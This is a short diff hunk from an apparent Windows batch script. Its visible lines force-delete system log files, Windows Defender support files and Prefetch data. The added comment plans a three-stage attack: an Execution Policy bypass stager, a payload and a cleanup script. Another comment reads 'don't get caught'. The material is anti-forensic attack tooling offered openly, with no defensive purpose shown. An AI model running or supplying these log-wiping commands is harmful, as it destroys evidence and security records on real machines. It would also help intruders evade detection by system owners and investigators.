@@ -36,7 +36,7 @@ del /f /q %SystemRoot%\System32\LogFiles\*.*
 del /f /q C:\ProgramData\Microsoft\Windows Defender\Support\*.*
 del /f /q C:\Windows\Prefetch\*.*
 
-
+#My goal is create 3 stages: the stager to bypass Execution Policy, the payload, and a full cleanup script. more to come soon.
 # Remove Comments. Enjoy and don't get caught
 
 
